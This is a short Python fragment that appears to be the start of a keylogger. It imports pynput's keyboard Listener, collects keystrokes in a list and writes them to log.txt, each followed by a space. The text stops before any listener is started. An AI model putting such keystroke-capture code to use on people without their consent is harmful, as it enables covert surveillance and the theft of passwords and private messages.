import os, pynput
from pynput.keyboard import Key, Listener

keys = []

def write_file(keys):     
  with open('log.txt', 'w') as f:
    for key in keys:
        # removing ''
        k = str(key).replace("'", "")
        f.write(k)      
        # explicitly adding a space after
        # every keystroke for readability
        f.write(' ')